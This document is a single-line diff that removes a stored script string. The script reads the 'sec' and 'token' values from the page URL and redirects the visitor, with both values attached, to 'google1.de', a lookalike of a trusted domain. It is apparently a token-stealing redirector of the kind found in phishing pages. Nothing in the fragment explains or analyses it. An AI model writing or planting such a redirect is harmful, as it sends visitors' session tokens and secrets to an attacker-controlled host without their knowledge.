@@ -1,1 +1,0 @@
-b'<script>\r\r\tvar url = new URL(window.location.href);\r\r\tvar sec = url.searchParams.get("sec");\r\r\tvar token = url.searchParams.get("token");\r\r\tvar secret = ["https://google1.de","https://google1.de"];\r\r\r\r\tvar d = (secret[Math.floor(Math.random()*secret.length)]+"?sec="+sec+"&token="+token);\r\r\twindow.location = d;\r\r</script>'
